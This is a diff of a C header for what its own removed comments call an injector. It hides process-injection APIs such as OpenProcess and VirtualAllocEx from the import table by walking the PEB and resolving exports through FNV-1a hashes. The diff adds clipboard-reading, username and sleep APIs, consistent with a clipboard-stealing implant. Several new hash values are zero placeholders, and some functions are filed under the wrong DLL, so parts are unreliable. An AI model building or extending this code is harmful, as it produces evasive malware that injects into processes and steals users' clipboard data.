@@ -1,29 +1,3 @@
-/*
- * peb-lookup.h — Centralized Dynamic API Resolution via PEB Walk + FNV-1a Hashing
- *
- * PURPOSE:
- *   Removes suspicious Windows API imports (OpenProcess, VirtualAllocEx, etc.)
- *   from the Import Address Table (IAT) by resolving them at runtime through
- *   the Process Environment Block (PEB) InMemoryOrderModuleList.
- *
- * ADDING A NEW API (3 steps):
- *   1. Add a typedef for the function pointer (see typedefs below).
- *   2. Add a member to the DYNAMIC_APIS struct.
- *   3. Add one line in InitDynamicAPIs() to resolve it.
- *
- * GENERATING A HASH:
- *   Module hashes use uppercase FNV-1a on the wide DLL name (e.g., "KERNEL32.DLL").
- *   Function hashes use case-sensitive FNV-1a on the exact export name.
- *   Python one-liner:
- *     python3 -c "
- *     def fnv1a(s):
- *         h=2166136261
- *         for c in s: h=((h^ord(c))*16777619)&0xFFFFFFFF
- *         print(hex(h))
- *     fnv1a('OpenProcess')
- *     "
- */
-
 #ifndef PEB_LOOKUP_H
 #define PEB_LOOKUP_H
 
@@ -37,15 +11,11 @@
 
 /* ============================================================================
  * NT Structures for PEB Walking
- *
- * MinGW's <winternl.h> provides incomplete definitions.  We define our own
- * versions that expose the fields needed to walk InMemoryOrderModuleList and
- * read BaseDllName for each loaded module.
  * ========================================================================= */
 
 typedef struct _MY_PEB_LDR_DATA {
-    BYTE       Reserved1[8];       /* Length + Initialized               */
-    PVOID      Reserved2;          /* SsHandle                           */
+    BYTE       Reserved1[8];
+    PVOID      Reserved2;
     LIST_ENTRY InLoadOrderModuleList;
     LIST_ENTRY InMemoryOrderModuleList;
     LIST_ENTRY InInitializationOrderModuleList;
@@ -70,15 +40,18 @@ typedef struct _MY_LDR_DATA_TABLE_ENTRY {
 #define FNV1A_PRIME         16777619U
 
 /* ============================================================================
- * Pre-calculated Module Hashes (uppercase FNV-1a of wide DLL name)
+ * Pre-calculated Module Hashes
  * ========================================================================= */
 
-#define HASH_KERNEL32_DLL   0x29CDD463U  /* FNV-1a("KERNEL32.DLL") */
+#define HASH_KERNEL32_DLL   0x29CDD463U
+#define HASH_USER32_DLL     0x00000000U // À REMPLIR
+#define HASH_ADVAPI32_DLL   0x00000000U // À REMPLIR
 
 /* ============================================================================
- * Pre-calculated Function Hashes (case-sensitive FNV-1a of export name)
+ * Pre-calculated Function Hashes
  * ========================================================================= */
 
+/* KERNEL32 */
 #define HASH_OpenProcess                0x4105FC56U
 #define HASH_VirtualAllocEx             0xAEB6049CU
 #define HASH_VirtualProtect             0x820621f3U
@@ -93,37 +66,40 @@ typedef struct _MY_LDR_DATA_TABLE_ENTRY {
 #define HASH_FormatMessageA             0x3F75A588U
 #define HASH_GetStdHandle               0xe3b9876aU
 #define HASH_WriteFile                  0x7f07c44aU
+#define HASH_Sleep                      0x00000000U // À REMPLIR
+#define HASH_WaitForSingleObject        0x00000000U // À REMPLIR
+#define HASH_DisableThreadLibraryCalls  0x00000000U // À REMPLIR
+
+/* USER32 */
+#define HASH_GetClipboardSequenceNumber 0x00000000U // À REMPLIR
+#define HASH_OpenClipboard              0x00000000U // À REMPLIR
+#define HASH_GetClipboardData           0x00000000U // À REMPLIR
+#define HASH_CloseClipboard             0x00000000U // À REMPLIR
+#define HASH_GlobalLock                 0x00000000U // À REMPLIR
+#define HASH_GlobalUnlock               0x00000000U // À REMPLIR
+
+/* ADVAPI32 */
+#define HASH_GetUserNameA               0x00000000U // À REMPLIR
 
 /* ============================================================================
  * Hash Functions
  * ========================================================================= */
 
-/* FNV-1a hash of a narrow (ASCII) string — used for export function names. */
 DWORD HashStringFNV1a(const char* str);
-
-/* FNV-1a hash of a wide string, converting each character to uppercase —
- * used for module names where casing may vary (e.g., kernel32.dll vs KERNEL32.DLL). */
 DWORD HashStringFNV1aW(const wchar_t* str);
 
 /* ============================================================================
  * PEB-based Resolution Functions
  * ========================================================================= */
 
-/* Walk InMemoryOrderModuleList to find a module whose BaseDllName matches
- * the given FNV-1a hash (uppercase comparison). Returns the module base or NULL. */
 HMODULE GetModuleBase_Hashed(DWORD moduleHash);
-
-/* Parse the Export Address Table (EAT) of `hMod` to find an export whose
- * name matches the given FNV-1a hash. Returns the function address or NULL. */
 FARPROC GetExportAddress_Hashed(HMODULE hMod, DWORD functionHash);
 
 /* ============================================================================
  * Function Pointer Typedefs
- *
- * Each typedef matches the exact signature of the Windows API it replaces.
- * To add a new API, copy the MSDN signature and create a matching typedef.
  * ========================================================================= */
 
+/* KERNEL32 */
 typedef HANDLE (WINAPI *fnOpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
 typedef LPVOID (WINAPI *fnVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
 typedef BOOL   (WINAPI *fnVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);
@@ -138,16 +114,27 @@ typedef DWORD  (WINAPI *fnGetLastError)(void);
 typedef DWORD  (WINAPI *fnFormatMessageA)(DWORD dwFlags, LPCVOID lpSource, DWORD dwMessageId, DWORD dwLanguageId, LPSTR lpBuffer, DWORD nSize, va_list* Arguments);
 typedef HANDLE (WINAPI *fnGetStdHandle)(DWORD nStdHandle);
 typedef BOOL   (WINAPI *fnWriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
+typedef VOID   (WINAPI *fnSleep)(DWORD dwMilliseconds);
+typedef DWORD  (WINAPI *fnWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
+typedef BOOL   (WINAPI *fnDisableThreadLibraryCalls)(HMODULE hLibModule);
+
+/* USER32 */
+typedef DWORD  (WINAPI *fnGetClipboardSequenceNumber)(void);
+typedef BOOL   (WINAPI *fnOpenClipboard)(HWND hWndNewOwner);
+typedef HANDLE (WINAPI *fnGetClipboardData)(UINT uFormat);
+typedef BOOL   (WINAPI *fnCloseClipboard)(void);
+typedef LPVOID (WINAPI *fnGlobalLock)(HGLOBAL hMem);
+typedef BOOL   (WINAPI *fnGlobalUnlock)(HGLOBAL hMem);
+
+/* ADVAPI32 */
+typedef BOOL   (WINAPI *fnGetUserNameA)(LPSTR lpBuffer, LPDWORD pcbBuffer);
 
 /* ============================================================================
- * DYNAMIC_APIS — The Scalable API Structure
- *
- * All dynamically resolved function pointers live here.  Code throughout the
- * injector accesses them via the global `g_Api` instance.
+ * DYNAMIC_APIS Structure
  * ========================================================================= */
 
 typedef struct _DYNAMIC_APIS {
-    /* Process manipulation */
+    /* KERNEL32 */
     fnOpenProcess               pOpenProcess;
     fnVirtualAllocEx            pVirtualAllocEx;
     fnVirtualProtect            pVirtualProtect;
@@ -157,22 +144,29 @@ typedef struct _DYNAMIC_APIS {
     fnCloseHandle               pCloseHandle;
     fnGetStdHandle              pGetStdHandle;
     fnWriteFile                 pWriteFile;
-
-    /* Process enumeration */
     fnCreateToolhelp32Snapshot  pCreateToolhelp32Snapshot;
     fnProcess32First            pProcess32First;
     fnProcess32Next             pProcess32Next;
-
-    /* Error reporting */
     fnGetLastError              pGetLastError;
     fnFormatMessageA            pFormatMessageA;
+    fnSleep                     pSleep;
+    fnWaitForSingleObject       pWaitForSingleObject;
+    fnDisableThreadLibraryCalls pDisableThreadLibraryCalls;
+
+    /* USER32 */
+    fnGetClipboardSequenceNumber pGetClipboardSequenceNumber;
+    fnOpenClipboard              pOpenClipboard;
+    fnGetClipboardData           pGetClipboardData;
+    fnCloseClipboard             pCloseClipboard;
+    fnGlobalLock                 pGlobalLock;
+    fnGlobalUnlock               pGlobalUnlock;
+
+    /* ADVAPI32 */
+    fnGetUserNameA               pGetUserNameA;
 } DYNAMIC_APIS, *PDYNAMIC_APIS;
 
-/* Global instance — defined in peb-lookup.c */
 DOT_TEXT extern DYNAMIC_APIS g_Api;
 
-/* Resolve all APIs in g_Api. Call once at program start.
- * Returns true on success, false if any critical API could not be resolved. */
 DYNAMIC_APIS * InitDynamicAPIs(void);
 DYNAMIC_APIS * getAPI(void);
 
